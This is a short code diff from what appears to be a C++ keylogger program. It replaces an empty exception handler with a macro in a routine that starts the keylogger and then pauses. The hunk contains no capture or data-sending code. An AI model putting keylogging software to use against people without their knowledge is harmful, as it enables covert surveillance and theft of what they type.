@@ -27,9 +27,7 @@ int submain(int argc, char ** argv)
 		//Keylogger::instance().addObserver(new JamKeyObserver(keys));
 		Keylogger::instance().start();
 	}
-	catch(Common::Exception&)
-	{
-	}
+	CATCH_COMMON_EXCEPTION
 	CATCH_UNKNOWN_EXCEPTION
 	system("pause");
 	return EXIT_SUCCESS;
